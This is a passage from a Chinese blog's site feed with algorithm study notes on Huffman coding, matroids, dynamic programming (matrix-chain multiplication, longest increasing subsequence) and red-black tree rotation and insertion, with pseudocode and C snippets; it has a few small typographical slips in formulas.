class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C为字符集合</span></span><br><span class="line"><span class="comment">// Q是最小堆，初始包含n个字符对应的频率</span></span><br><span class="line">Huffman(C)</span><br><span class="line">    n = |C|</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n<span class="number">-1</span></span><br><span class="line">        z = <span class="keyword">new</span> node()</span><br><span class="line">        z.left = x = Extract-min(Q)</span><br><span class="line">        z.right = y = Extract-min(Q)</span><br><span class="line">        z.v = x.v+y.v</span><br><span class="line">        Insert(Q,z)</span><br><span class="line">    <span class="keyword">return</span> Extract-min(Q)</span><br></pre></td></tr></table></figure><p>　　我们每次从堆中拿出频率最小的两个元素，将它们合并成一棵树，然后再把树根重新扔进堆中。最后，我们就得到了霍夫曼编码的前缀树了。算法导论的图如下:<br><img src="/2019/10/09/greedy-algorithm/huffman-solve.png" alt="huffman"><br>　　看起来霍夫曼编码的实现似乎挺显而易见，然而正确性又该怎么证明呢？书中给出的证明方法是这样的:</p><p>　　引理1：令C为字符集，其中每个字符c都有一个频率c.freq。令x和y是C中频率最低的两个字符。那么存在C的一个最优前缀码，使得x和y的码字长度相同，且只有最后一个二进制位不同<br>　　证明方法是令T为任意一个最优前缀编码树，x和y频率最低的两个字符对应的结点，a和b是深度最大的兄弟叶结点。不妨假设a.freq&lt;=b.freq且x.freq&lt;=y.freq，由于x和y频率最小，我们有x.freq&lt;=a.freq且y.freq&lt;=b.freq。那么交换x和a，得到的新树T’和原树T的代价差为:<br>$$<br>\begin{align}<br>A =&amp; \, x.freq \ast d_T(x)+a.freq \ast d_T(a)-x.freq \ast d_{T’}(x)-a.freq \ast d_{T’}(a)\\<br>=&amp; \, x.freq \ast d_T(x)+a.freq \ast d_T(a)-x.freq \ast d_T(a)-a.freq \ast d_T(x)\\<br>=&amp; \, (a.freq-x.freq) \ast (d_T(a)-d_T(x))\\<br>\geq &amp; \, 0<br>\end{align}<br>$$<br>　　引理2：令C为字符集，其中每个字符c都有一个频率c.freq。令x和y是C中频率最低的两个字符。令C’为C去掉字符x和y，加入一个字符z后得到的字母表。类似C，也为C’定义freq，其中z.freq=x.freq+y.freq。另T’为字母表C’的任意一个最优前缀码对应的编码树。于是我们可以将T’中叶子结点z替换为一个以x和y为孩子的内部结点，得到树T，且T表示字母表的一个最优前缀码<br>　　由引理1和引理2，我们可以成功地证明霍夫曼编码可以获得一个最优前缀码。<br>　　另外，由霍夫曼编码的构造方式，我们可以证明。对于一个由8位字符组成的数据文件，若256个字符的频率大致相同(最高的频率低于最低的两倍)，霍夫曼编码并不比8位固定长度编码方式更加高效。由此继续可以证明，对于一个随机生成的8位字符组成的文件，没有任何压缩方法可以将其压缩！</p><h3 id="Matroid"><a href="#Matroid" class="headerlink" title="Matroid"></a>Matroid</h3><p>　　在贪心算法后，书中还提到了一种特殊的理论——拟阵。这种理论描述了很多贪心算法生成最优解的情形，并且覆盖了很多其他应用。<br>　　拟阵是一个满足这种条件的序偶\(M=(S,{\mathcal{I}})\):</p><ol><li>S是一个有限集</li><li>\({\mathcal{I}}\)是S的子集的一个非空族，这些子集为S的独立子集，使得如果\(B \in {\mathcal{I}} 且 A \subseteq B\)，则\(A \in {\mathcal{I}}\)。我们称\({\mathcal{I}}\)是遗传的。注意，\({\mathcal{I}}\)必然包含空集。</li><li>若\(A \in {\mathcal{I}}，B \in {\mathcal{I}}且|A|&lt;|B|\)，那么存在某个元素\(x \in B-A 使得 A \cup {x} \in {\mathcal{I}}\)。即M满足交换性质。</li></ol><p>　　简单来说，条件2即为:若T是S的某一个独立子集，则T的子集同样是S的独立子集。条件3保证了所有的最大独立子集(即再添加元素后就不满足独立性)的大小是相同的。这是拟阵很重要的两个性质。另一个很常见的拟阵的例子是图拟阵\(M_G=(S_G,{\mathcal{I_G}})\)。它定义在一个给定的无向图\(G=(V,E)\)上:</p><ol><li>\(S_G\)定义为E，即G的边集</li><li>如果A是E的子集，则\(A \in {\mathcal{I_G}}\)当且仅当A中的边不会构成环，也就是说，边集A是独立的当且仅当子图\(G_A=(V,A)\)形成一个森林。</li></ol><p>　　下面证明G是无向图(无重复边)时，\(M_G=(S_G,{\mathcal{I_G}})\)是一个拟阵:</p><ol><li>边集\(S_G=E\)显然是有限集，条件1成立。森林的一个子集显然也是森林，故条件2也成立</li><li>对于一个无向图\(G=(V,E)\)，包含了\(t=|V|-|E|\)棵树(可用树中边和点的数量关系证明)。此时，若\(A \in {\mathcal{I_G}}，B \in {\mathcal{I_G}}且|A|&lt;|B|\)，那么森林\(G_A,G_B\)分别包含\(|V|-|A|和|V|-|B|\)棵树。即\(G_B\)中树的数量比A少，B中必然存在某棵树T，其中存在一条边\((u,v)\)，满足\(u,v在G_A\)中属于两棵不同的树。因此将边\((u,v)\)添加进森林\(G_A\)中，能保持森林的性质，不会产生环，故满足了条件3。</li></ol><p>　　对于一个图拟阵\(M_G\)，其最大独立子集边数必定为\(|V|-1\)，它连接了所有的顶点，这样的一棵树成为生成树。在拟阵的基础上，我们可以定义一种加权拟阵，即将拟阵与一个权重函数w相关联，每条边x具有一个权重w(x)&gt;0。我们可以计算整棵树的权重:</p><p>$$w(A)=\Sigma_{x \in A}w(x)$$</p><p>　　利用贪心算法，我们可以求得加权拟阵中权重最大的独立子集。其中一种重要的应用就是最小生成树。给定一个连通无向图\(G=(V,E)\)，每条边e都有权重w(e)，我们希望求得一个边的子集，使得这些边能构成一棵连接所有顶点的树，且权重之和最小。我们可以将这个问题转化为图拟阵的最优子集问题。考虑加权拟阵\(M_G\)，其权重函数为\(w(e)=w_0-w\)，其中\(w_0\)为一个足够大的常数，保证权重函数的非负性质。显然，此加权拟阵的最优子集即为原图的最小生成树的边集。求解最优子集的算法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Greedy(M,w)</span><br><span class="line">    A = 空集</span><br><span class="line">    sort(M.S) <span class="comment">// 从大到小</span></span><br><span class="line">    <span class="keyword">for</span> x in M.S</span><br><span class="line">        <span class="keyword">if</span> A并x是M的独立子集</span><br><span class="line">            A = A并x</span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure><h2 id="Dynamic-programming"><a href="#Dynamic-programming" class="headerlink" title="Dynamic programming"></a>Dynamic programming</h2><p>　　动态规划同样是算法系列及其重要的部分。用一句话概括的话，动态规划就是不断的将当前问题划分成多个可解决的小问题，并且满足所有小问题的解能合成当前问题的解。动态规划的求解过程就是一个不断地划分问题的过程。<br>　　动态规划问题的求解步骤如下:</p><ol><li>刻画一个最优解的结构特征</li><li>递归地定义最优解的值</li><li>计算最优解的值，通常采用自底向上的方法</li><li>利用计算出的信息构造出一个最优解</li></ol><p>　　这样写可能还是有点难理解，我们还是直接来看一道简单的题吧。</p><h3 id="Matrix-chain-multiplication-problem"><a href="#Matrix-chain-multiplication-problem" class="headerlink" title="Matrix-chain multiplication problem"></a>Matrix-chain multiplication problem</h3><p>　　矩阵链乘法应该算是动态规划的一个典型例子。给定n个矩阵的序列\(&lt;A_1,A_2,A_3,…A_n&gt;\)，矩阵\(A_i\)的规模为\(p_{i-1} \times p_i\)，求一个完全括号化方案，使得乘积\(A_1A_2A_3…A_n\)所需的标量乘法次数最少。<br>　　我们知道两个矩阵大小分别为\((x,y),(y,z)\)时，它们能做矩阵乘法，且所需的标量乘法的次数为\(x \times y \times z\)。比如给定三个矩阵的规模为\(A_1=(2,3),A_2=(3,4),A_3=(4,2)\)，如果按顺序相乘，我们所需的乘法次数为\(2 \times 3 \times 4 + 2 \times 4 \times 2 = 40\)，如果我们让后面两个矩阵先进行乘法，我们所需的乘法次数变成\(3 \times 4 \times 2 + 2 \times 3 \times 2 = 36\)。乘法次数变少了!现在我们的问题就是当矩阵的数量变成n时，应该如何编程求解?<br>　　为了方便起见，我们用符号\(A_{i..j}表示A_iA_{i+1}…A_j\)的结果。显然，如果i&lt;j，我们必须在某一个\(A_k和A_{k+1}\)时间将矩阵链分开。也就是说，我们首先计算\(A_{i..k}和A_{k+1..j}\)，再计算它们之间的乘积，最终我们得到了\(A_{i..j}\)的值。<br>　　于是，我们得到以下的递归求解方案:<br>$$<br>A[i,j]=\begin{cases}<br>0,\quad 如果 i = j \\<br>\max\limits_{i \leq k &lt; j} {m[i,k]+m[k+1,j]+p_{i-1}p_kp_j},\quad 如果 i \not= j<br>\end{cases}<br>$$</p><p>　　将上述的公式转化为伪代码，则我们得到:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MATRIX-CHAIN-ORDER(p)</span><br><span class="line">n = p.length<span class="number">-1</span></span><br><span class="line">创建数组 m[<span class="number">1.</span>.n <span class="number">1.</span>.n] 和 s[<span class="number">1.</span>.n<span class="number">-1</span>,<span class="number">2.</span>.n]</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">    m[i,i] = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> l = <span class="number">2</span> to n</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n-l+<span class="number">1</span></span><br><span class="line">        j = i+l<span class="number">-1</span></span><br><span class="line">        m[i,j]=无穷</span><br><span class="line">        <span class="keyword">for</span> k = i to j<span class="number">-1</span></span><br><span class="line">            q = m[i,k]+m[k+<span class="number">1</span>,j]+p[i<span class="number">-1</span>]*p[k]*p[j]</span><br><span class="line">            <span class="keyword">if</span> q &lt; m[i,j]</span><br><span class="line">                m[i,j] = q</span><br><span class="line">                s[i,j] = k</span><br><span class="line"><span class="keyword">return</span> m <span class="keyword">and</span> s</span><br></pre></td></tr></table></figure><h3 id="Sequence-problem"><a href="#Sequence-problem" class="headerlink" title="Sequence problem"></a>Sequence problem</h3><p>　　序列问题是动态规划问题当中一个很重要的组成部分。其中就有这样一道经典的LIS问题:</p><blockquote><p>某国为了防御敌国的导弹袭击，发展出一种导弹拦截系统。但是这种导弹拦截系统有一个缺陷：虽然它的第一发炮弹能够到达任意的高度，但是以后每一发炮弹都不能高于前一发的高度。某天，雷达捕捉到敌国的导弹来袭。由于该系统还在试用阶段，所以只有一套系统，因此有可能不能拦截所有的导弹。<br>输入导弹依次飞来的高度（雷达给出的高度数据是≤50000的正整数），计算这套系统最多能拦截多少导弹，如果要拦截所有导弹最少要配备多少套这种导弹拦截系统。</p></blockquote><p>　　最长上升子序列(Least-increasing sequence)问题通常有两种写法。第一种是动态规划，复杂度为\(O(n_2)\)。这类问题任务是从一个数组当中选出一个单调递增/递减的子数组。假设数组长度为n，对于当前第i个元素，我们可以得到以该元素为末尾的子数组的最长数组。我们可以得到以下的递归求解方案(以递减为例子):</p><p>$$dp[i] = \max\limits_{\forall k,k&lt;i，a[k]&gt;=a[i]}dp[k]+1$$</p><p>　　对于第i个元素，我们都要访问i-1个元素，最后的复杂度就是\(O(n_2)\)了。代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> dp[N]; <span class="comment">// dp[i]表示第i个元素结尾的子数组的最大长度</span></span><br><span class="line"><span class="keyword">int</span> a[N]; <span class="comment">// a为输入序列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[k] &gt;= a[i]) &#123;</span><br><span class="line">                dp[i] = max(dp[i], dp[k]+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (dp[i] &gt; ans) &#123;</span><br><span class="line">                    ans = dp[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　然而，这种写法的复杂度过高了，通常情况下，我们会采取第二种做法——贪心。如果我们换一个角度考虑，对于当前的第i个元素，假设dp[i]=p，说明以第i个元素为结尾的子数组最大长度为p，那么前面i-1个元素必然包含一个长度为p-1的子数组。也就是说，\(\exists k &lt; i, dp[k] = p-1\)。采用贪心的思想，我们只需要取满足条件的k中<strong>a[k]最大的那个</strong>就可以了!<br>　　…待续</p><h3 id="Knapsack-problem"><a href="#Knapsack-problem" class="headerlink" title="Knapsack problem"></a>Knapsack problem</h3><h3 id="State-compression"><a href="#State-compression" class="headerlink" title="State compression"></a>State compression</h3><h2 id="Differences"><a href="#Differences" class="headerlink" title="Differences"></a>Differences</h2><p>　　可以看到，贪心算法和动态规划之间的关系是很紧密的。两种在应用的时候，都要求被解决的问题有最优子结构，并且能够子问题能够合成原问题，但贪心算法的要求会更”高”一些。如果单纯应用贪心算法，我们并不一定能得到一个最优解，而动态规划能保证我们会获得一个最优的结果。并且，动态规划的应用范围要比贪心算法更加广泛，分支也有很多，像是序列的题目LCS，LIS，和LCIS，或是背包问题，区间/树上DP，状态压缩类DP，插头DP等。贪心的话往往是要结合具体题目去分析。</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>　　这篇博客主要是写贪心算法和动态规划算法的一些知识，并对两者做一个简单的对比。后续如果有时间的话，还是会尽量补上的。(咕咕咕</p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(V) —— RB Tree</title>
      <link href="/2019/10/04/data-structure5/"/>
      <url>/2019/10/04/data-structure5/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是数据结构大杂烩系列的第五篇文章(有生之年系列)。在前几篇文章中，我们学习了几种树结构，以及treap和splay两种平衡树。今天，我们将介绍一种应用十分广泛，且性能也十分优秀的平衡树——红黑树。不过由于网上资料较多，且笔者能力有限，这篇文章只是对算法导论中关于红黑树的知识的一些简单整理而已。</p><h2 id="what-is-RB-Tree"><a href="#what-is-RB-Tree" class="headerlink" title="what is RB-Tree"></a>what is RB-Tree</h2><p>　　首先，需要回答这样一个问题:为什么使用红黑树呢？答案其实是很简单的。因为红黑树的表现十分优秀！红黑树能够保证树不会退化成链表，导致效率的急剧下降。简单来说，红黑树是一颗特殊的二叉搜索树，它在每个节点上增加了一个存储位来表示节点的颜色(红或黑)。并且，由于这一个特性，红黑树中到叶子节点的简单路径中，不会有一条路径长度是其他路径的两倍。<br>　　红黑树满足以下性质:</p><ol><li>每个结点是黑色或者红色</li><li>根节点是黑色</li><li>每个叶子结点是黑色的(NIL)</li><li>如果一个结点是红色的，那么它的两个子结点都是黑色的</li><li>对每个结点，该结点到所有后代叶结点的简单路径上均包含相同数目的黑色结点</li></ol><p>　　一颗合法的红黑树:<br><img src="/2019/10/04/data-structure5/rb-tree.png" alt="red-black tree"><br>　　同时，红黑树中有一种特殊的节点是NIL，起到相当与空结点的作用，但可以减少一些边界判断(其实就是哨兵)。另外，由于红黑树的性质5，我们可以定义红黑树的黑高bh，定义为该结点到所有叶结点的路径上黑色结点的数量。<br>　　此时，我们可以证明，一颗有n个内部结点(即不含NIL)的红黑树高度至多为\(\,2log(n+1)\)<br>　　证明: 先证任一结点为根的子树中至少包含\(\,2^{bh(x)}-1\)个内部结点。可以用数学归纳法证明。又由于根到任意叶子结点的任何一条路径上都至少有一半的结点为黑色(性质4)，因此有\(n &gt;= 2^{h/2}-1\)，整理得，\(h&lt;=2log(n+1)\)<br>　　我们接下来可以知道，红黑树上的插入，删除等操作的运行时间均为O(h)，因此我们可以得到这些操作的时间都是O(logn)<br>　　这篇文章接下来将以<a href="https://www.luogu.org/problem/P3369" target="_blank" rel="noopener">洛谷P3369</a>为例子，讲讲如何简单地实现红黑树。我们将实现以下操作:</p><ol><li>插入数字x</li><li>删除数字x</li><li>查询数字x的排名</li><li>查询排名为x的数字</li><li>求x的前驱(比x小的数字中最大的那个)</li><li>求x的后继(比x大的数字中最小的那个)</li></ol><p>　　以下是红黑树的结点的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RED 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLACK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T Node*</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    T fa;</span><br><span class="line">    T lson;</span><br><span class="line">    T rson;</span><br><span class="line">    <span class="comment">// 需要维护的数据: 键值v，子树大小siz，该结点的次数cnt，颜色color</span></span><br><span class="line">    <span class="keyword">int</span> v, siz, cnt;</span><br><span class="line">    <span class="keyword">bool</span> color;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    Node(<span class="keyword">int</span> v, <span class="keyword">int</span> siz = <span class="number">1</span>, <span class="keyword">int</span> cnt = <span class="number">1</span>, <span class="keyword">int</span> color = RED):</span><br><span class="line">        v(v),siz(siz),cnt(cnt),color(color)&#123;&#125;</span><br><span class="line">    <span class="comment">// up操作</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意我们需要保证空结点NIL的size为0，否则会出问题</span></span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        siz = lson-&gt;siz + rson-&gt;siz + cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="how-to-implement-Red-black-Tree"><a href="#how-to-implement-Red-black-Tree" class="headerlink" title="how to implement Red-black Tree"></a>how to implement Red-black Tree</h2><h3 id="rotation"><a href="#rotation" class="headerlink" title="rotation"></a>rotation</h3><p>　　我们知道，插入，删除等操作有可能会违背红黑树的红黑特性，因此我们需要一种操作来维持红黑树的特性不被改变，这就是旋转操作。和treap类似却又不太一样:红黑树的旋转同样分为左旋和右旋，但左旋是将当前节点旋转到左儿子的位置，右旋同理。具体操作如下:</p><p><img src="/2019/10/04/data-structure5/rot.png" alt="rotation"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里展示左旋的写法，右旋和左旋写法对称</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotL</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// partI 连接x和y的左儿子</span></span><br><span class="line">    T y = x-&gt;rson;</span><br><span class="line">    x-&gt;rson = y-&gt;lson;</span><br><span class="line">    <span class="keyword">if</span> (y-&gt;lson != nil) &#123;</span><br><span class="line">        y-&gt;lson-&gt;fa = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// partII y和x的父亲</span></span><br><span class="line">    y-&gt;fa = x-&gt;fa;</span><br><span class="line">    <span class="keyword">if</span> (x-&gt;fa == nil) &#123;</span><br><span class="line">        rt = y;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;fa-&gt;lson == x) &#123;</span><br><span class="line">        x-&gt;fa-&gt;lson = y;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        x-&gt;fa-&gt;rson = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// partIII 连接x和y</span></span><br><span class="line">    x-&gt;fa = y;</span><br><span class="line">    y-&gt;lson = x;</span><br><span class="line">    <span class="comment">// 最后别忘了up操作。注意x和y的先后顺序</span></span><br><span class="line">    x-&gt;up();y-&gt;up();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>　　我们先考虑普通的BST的情况。这种情形下，我们只需要找到一个可以插入数字v的节点即可。如果找到了，我们就直接将该结点的次数+1即可。如果找不到，我们就重新new一个结点。考虑到我们需要维护子树的大小，我们可以在查找的时候顺便更新一下查找路径上所有结点的siz。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    T cur = root;</span><br><span class="line">    <span class="keyword">while</span> (cur != NIL) &#123;</span><br><span class="line">        cur-&gt;siz++;</span><br><span class="line">        <span class="keyword">if</span> (v &lt; cur-&gt;v) &#123;</span><br><span class="line">            cur = cur-&gt;lson;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &gt; cur-&gt;v) &#123;</span><br><span class="line">            cur = cur-&gt;rson;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 找到了，直接次数+1后返回</span></span><br><span class="line">            cur-&gt;cnt++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找不到时，重新new一个结点</span></span><br><span class="line">    cur = <span class="keyword">new</span> Node(v);</span><br><span class="line">    <span class="comment">// 这里需要连接结点cur和父结点，并将左右儿子指向NIL</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　写到这里，又会有一个问题，新结点的颜色呢？为了满足红黑树的性质，新的节点只能是红色或者黑色。如果我们将新的结点设置为黑色的话，会发生什么情况？性质5会被破坏，如果我们想修复性质5，处理起来是很麻烦的。因此我们选择将新的结点设置为红色。这个时候，性质2，性质4有可能被破坏。修复性质2的话其实很简单，我们只需要将根节点设置为黑色就可以了(根节点的颜色不影响黑高bh)。修复性质4的话，我们需要分类讨论。我们在insert方法的最后，调用insert-fixed方法，维护红黑树的特性。<br>　　当插入节点的父结点为红色时，违背了性质4，这个时候我们需要通过旋转和重新染色来进行修复。首先，如果当前结点的父亲是黑色的话，那么不违背红黑树的性质，直接退出即可。否则，假设当前结点的父亲是祖先的左儿子，这时分三种情况讨论。(注意到父亲结点为红色时，祖先结点必然存在，因为根节点是黑色的)<br><img src="/2019/10/04/data-structure5/rb-insert.PNG" alt="insert"><br>　　情况1中，当前结点的叔叔结点为红色，这个时候我们可以将当前结点的父亲和叔叔染成黑色，将祖先染成红色，这个时候各个叶子结点的黑高并没有发生改变，故解决了问题。但是将祖先结点染成红色有可能会导致破坏了性质4，因此将x赋值为祖先结点，继续循环。<br>　　情况2中，叔叔结点为黑色，当前结点是父亲的右儿子。这个时候我们将x赋值为其父亲结点，同时对父亲结点进行左旋操作，就进入了情况3。<br>　　情况3中，叔叔节点为黑色，当前结点是父亲的左儿子，这个时候将父亲结点染成黑色，祖先结点染成红色，并对祖先结点进行一次右旋，然后我们就发现，红黑树的性质得到了维护，循环可以退出了。注意到右旋时，由于父亲结点是红色，因此兄弟结点一定是黑色，对祖先结点右旋后两个儿子都是黑色的，因此没有破坏性质4。<br>　　至于当前结点的父亲是祖先的右儿子时，情况也是一样的。只要把左儿子改为右儿子，左旋改为右旋就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_fixed</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (x-&gt;fa-&gt;color == RED) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x-&gt;fa == x-&gt;fa-&gt;fa-&gt;lson) &#123;</span><br><span class="line">            T y = x-&gt;fa-&gt;fa-&gt;rson;</span><br><span class="line">            <span class="comment">// 情况1: 叔叔结点为红色</span></span><br><span class="line">            <span class="keyword">if</span> (y-&gt;color == RED) &#123;</span><br><span class="line">                y-&gt;color = x-&gt;fa-&gt;color = BLACK;</span><br><span class="line">                x-&gt;fa-&gt;fa-&gt;color = RED;</span><br><span class="line">                x = x-&gt;fa-&gt;fa;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况2: 叔叔结点为黑色，且当前结点是父亲的右儿子</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (x == x-&gt;fa-&gt;rson) &#123;</span><br><span class="line">                x = x-&gt;fa;</span><br><span class="line">                rotL(x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况3: 叔叔结点为黑色，且当前节点是父亲的左儿子</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                x-&gt;fa-&gt;color = BLACK;</span><br><span class="line">                x-&gt;fa-&gt;fa-&gt;color = RED;</span><br><span class="line">                rotR(x-&gt;fa-&gt;fa);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 这里的写法和之前是对称的</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 别忘了把根节点设置为黑色</span></span><br><span class="line">    rt-&gt;color = BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><p>　　删除操作应该是最繁琐的一项了。同样的，我们先考虑普通的BST的情况。这种情形下，我们只需要找到需要删除的点的位置即可，并将该结点的次数-1，如果次数大于0，我们则可以直接返回，次数等于0时，则说明当前结点需要被移除。同样的，由于我们需要维护子树的大小，我们可以在查找的时候顺便更新一下查找路径上所有结点的siz。<br>　　那么该如何移除呢？在BST中，我们的做法是找出结点v的后继y，用y来替换结点v的位置(y的颜色也变成v的颜色)，同时，我们把y的右儿子提到y的位置(注意到y没有左儿子，因为它是v的后继，即v的右子树中最小的值)，这样我们就成功地将原先结点移除了。但是，由于y结点被x结点替换了，有可能会导致红黑树的特性被破坏，这里我们需要记录y原来的颜色，以便于我们的恢复操作。操作过后，对于整棵树来说，相当于少了一个y结点。如果y是红色，那么红黑树的性质并没有被破坏，直接返回即可。如果y是黑色，y节点(即当前x的位置)的所有子结点的黑高小了1，违背了性质5，同时也有可能违背了性质4。因此我们需要使用一个修复函数来维护红黑树的特性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 